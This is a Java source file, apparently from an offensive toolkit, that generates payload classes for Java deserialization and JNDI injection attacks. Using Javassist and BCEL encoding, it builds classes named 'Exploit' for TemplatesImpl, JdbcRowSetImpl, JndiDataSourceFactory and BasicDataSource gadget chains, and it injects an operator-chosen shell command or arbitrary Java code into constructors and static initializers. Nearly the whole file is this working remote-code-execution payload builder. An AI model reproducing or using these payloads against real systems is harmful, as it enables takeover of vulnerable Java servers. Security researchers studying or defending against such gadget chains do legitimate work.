package gadget;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Map;

public class Gadget {


    public static String getInsertCode(String command) {
        String source = "";

        String cmd = "";

        if (command.startsWith("code:")) {
            String codefile = command.substring(5);
            try {
                File file = new File(codefile);
                if (file.exists()) {
                    FileReader reader = new FileReader(file);
                    BufferedReader br = new BufferedReader(reader);
                    StringBuffer sb = new StringBuffer("");
                    String line = "";
                    while ((line = br.readLine()) != null) {
                        sb.append(line);
                        sb.append("\r\n");
                    }
                    cmd = sb.toString();
                } else {
                    System.err.println(String.format("[-] %s is not exists!", new Object[]{codefile}));
                    System.exit(0);
                }
                //System.err.println("----------------------------------Java code start----------------------------------");
                //System.err.println(cmd);
                //System.err.println("-----------------------------------Java code end-----------------------------------");
                source = cmd;
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else if (command.startsWith("cmd:")) {
            cmd = command.substring(4).replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
            String tpl = "try {\n" +
                    "            String cmd = \"" + cmd + "\";\n" +
                    "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                    "                    ? new String[]{\"cmd\", \"/c\", cmd}\n" +
                    "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                    "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n" +
                    "            pc.waitFor();\n" +
                    "        }catch (Exception e){\n" +
                    "            e.printStackTrace();\n" +
                    "        }";

            source = tpl;
        }

        return source;
    }

    public static byte[] getJdbcRowSetImplExpCode(String command) {
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(Default.class.getName());
            clazz.setName("Exploit");
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            code = String.format("{%s}", code);
            ctConstructor.setBody(code);

            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    public static byte[] getJndiDataSourceFactory1ExpCode(String command) {
        try {
            String code = getInsertCode(command);
            ClassPool classPool = ClassPool.getDefault();
            // 获取class
            //System.out.println("ClassName: " + DasicDataSource.class.getName());
            final CtClass clazz = classPool.get(JndiDataSourceFactory1.class.getName());

//            // 插入静态代码块，在代码末尾。
//            clazz.makeClassInitializer().insertAfter(
//                    "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
//            );

            CtMethod ctMethod = clazz.getDeclaredMethod("getObjectInstance");
            code = String.format("{%s\nreturn null;}", code);
            //System.out.println(code);
            ctMethod.setBody(code);

            clazz.setName("Exploit");//类的名称，可以通过它修改。
            clazz.writeFile("/tmp");//将生成的.class文件保存到磁盘
            // 获取bytecodes
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] getTemplatesImpl1ExpCode(String command) {
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(TemplatesImpl1.class.getName());
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            ctConstructor.setBody("{}");

            code = String.format("{%s}", code);
            ctConstructor.setBody(code);
            clazz.setName("Exploit");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] getTemplatesImpl2ExpCode(String command) {
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(TemplatesImpl2.class.getName());
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            ctConstructor.setBody("{}");

            code = String.format("{%s}", code);
            ctConstructor.setBody(code);
            clazz.setName("Exploit");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    /**
     * https://github.com/bit4woo/Java_deserialize_vuln_lab/blob/master/src/Step6EvilClass/createEvilClass.java
     *
     * @param command
     * @return
     */
    public static byte[] getBasicDataSource1ExpCode(String command) {
        try {
            String code = getInsertCode(command);
            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(Default.class.getName());

            CtConstructor ci = clazz.makeClassInitializer();
            ci.setBody(code);

            clazz.setName("Exploit");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String getBasicDataSource2ExpCode(String command) {
        String exp =
                "import java.io.*;\n" +
                        "\n" +
                        "public class Exploit {\n" +
                        "\n" +
                        "    public static String exec(String cmd){\n" +
                        "        String[] shell  = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")? new String[]{\"cmd.exe\",\"/c\",cmd}:new String[]{\"/bin/bash\",\"-c\",cmd};\n" +
                        "        String s = \"\";\n" +
                        "        try {\n" +
                        "            Process p = Runtime.getRuntime().exec(shell);\n" +
                        "            InputStream is = p.getInputStream();\n" +
                        "            BufferedInputStream bis = new BufferedInputStream(is);\n" +
                        "            int len;\n" +
                        "            int bufferSize = 1024*4;\n" +
                        "            byte[] buffer = new byte[bufferSize];\n" +
                        "            while((len=bis.read(buffer,0,bufferSize))!=-1){\n" +
                        "                s+=new String(buffer,0,len);\n" +
                        "            }\n" +
                        "            is.close();\n" +
                        "            bis.close();\n" + "" +
                        "            BufferedInputStream eis = new BufferedInputStream(p.getErrorStream());\n" +
                        "            while((len=eis.read(buffer,0,bufferSize))!=-1){\n" +
                        "                s+=new String(buffer,0,len);\n" +
                        "            }\n" +
                        "            eis.close();" +
                        "        } catch (IOException e) {\n" +
                        "        }finally {\n" +
                        "            throw  new RuntimeException(\"**************************\"+s);\n" +
                        "        }\n" +
                        "    }\n" +
                        "\n" +
                        "    static{\n" +
                        "        exec(\"c\");\n" +
                        "    }\n" +
                        "}\n";
        JavaStringCompiler compiler = new JavaStringCompiler();
        try {
            Map<String, byte[]> map = compiler.compile("Exploit.java", String.format(exp, command));
            return Utility.encode(map.get("Exploit"), true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getBasicDataSource3ExpCode(String command) {
        String exp =
                        "public class Exploit {\n" +
                        "\n" +
                        "    public static void exec(String cmd){\n" +
                        "        try {\n" +
                        "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                        "                    ? new String[]{\"cmd\", \"/c\", cmd}\n" +
                        "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                        "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n" +
                        "            pc.waitFor();\n" +
                        "        }catch (Exception e){\n" +
                        "            e.printStackTrace();\n" +
                        "        }\n" +
                        "    }\n" +
                        "\n" +
                        "    static{\n" +
                        "        exec(\"calc\");\n" +
                        "    }\n" +
                        "}\n";

        JavaStringCompiler compiler = new JavaStringCompiler();
        try {
            Map<String, byte[]> map = compiler.compile("Exploit.java", exp);
            return Utility.encode(map.get("Exploit"), true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void main(String[] args) {
        Gadget.getTemplatesImpl1ExpCode("cmd:ifconfig");
    }
}
